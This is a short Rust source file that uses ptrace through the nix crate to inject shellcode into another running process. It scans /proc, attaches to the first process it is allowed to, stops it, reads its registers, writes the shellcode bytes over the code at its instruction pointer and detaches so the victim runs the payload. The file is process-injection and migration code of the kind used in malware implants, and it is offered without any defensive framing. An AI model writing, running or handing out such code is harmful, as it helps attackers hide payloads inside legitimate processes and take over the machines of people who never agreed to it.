extern crate nix;
use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
use nix::sys::wait::{waitpid, WaitPidFlag};
use nix::unistd::Pid;
use std::process::{self, Command};
use std::ffi::c_void;

pub fn inject_and_migrate(shellcode: &[u8]) {
    // Find a PID that ptrace can attach to
    let mut target_pid = 0;
    let list_pids = Command::new("ls")
            .arg("/proc/")
            .output()
            .unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
                                                        .unwrap()
                                                        .split('\n')
                                                        .flat_map(|s| s.parse().ok())
                                                        .collect();
    pids.retain(|i| *i > 100 && *i != process::id() as i32);
    for pid in pids.iter().rev() {
        if attach(Pid::from_raw(*pid)).is_ok() {
            target_pid = *pid;
            break;
        };
    }
    if target_pid == 0 {
        panic!("Could not find a process whose memory can be manipulated");
    }

    // Wait for the process to change to a stopped state, then dump registers
    let target_pid = Pid::from_raw(target_pid);
    if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
        panic!("Could not wait for target process to change state: {error}");
    }
    let mut registers = match getregs(target_pid) {
        Err(error) => panic!("Could not get registers for target process: {error}"),
        Ok(value) => value
    };

    let mut point = registers.rip;
    registers.rip += 2;
    
    if let Err(error) = setregs(target_pid, registers) {
        panic!("Unable to reset target process registers: {error}");
    }

    // Write shellcode to target process one byte at a time
    for byte in shellcode {
        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, *byte as *mut c_void) } {
            panic!("Unable to write portion of shellcode at {byte} to target process: {error}");
        }
        point += 1;
    }

    // Detach from the process so it can resume execution
    if let Err(error) = detach(target_pid, None) {
        panic!("Unable to detach from target process: {error}");
    }
}
